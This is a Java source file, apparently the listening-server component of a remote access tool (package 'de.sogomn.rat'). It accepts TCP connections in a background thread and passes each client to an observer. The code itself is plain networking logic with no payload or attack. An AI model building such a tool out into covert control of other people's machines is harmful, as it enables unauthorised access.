/*******************************************************************************
 * Copyright 2016 Johannes Boczek
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 *******************************************************************************/

package de.sogomn.rat.server;

import java.net.Socket;

import de.sogomn.engine.net.TCPServer;
import de.sogomn.rat.ActiveConnection;

public final class ActiveServer extends TCPServer {
	
	private Thread thread;
	
	private IServerObserver observer;
	
	public ActiveServer(final int port) {
		super(port);
	}
	
	private ActiveConnection acceptClient() {
		final Socket socket = acceptConnection();
		
		if (socket == null) {
			return null;
		}
		
		final ActiveConnection client = new ActiveConnection(socket);
		
		return client;
	}
	
	@Override
	public void close() {
		super.close();
		
		if (thread != null) {
			thread.interrupt();
			thread = null;
		}
		
		if (observer != null) {
			observer.closed(this);
		}
	}
	
	public void start() {
		final Runnable runnable = () -> {
			while (isOpen()) {
				final ActiveConnection client = acceptClient();
				
				if (observer != null && client != null) {
					observer.connected(this, client);
				}
			}
		};
		
		thread = new Thread(runnable, "Server");
		
		thread.start();
	}
	
	public void setObserver(final IServerObserver observer) {
		this.observer = observer;
	}
	
}
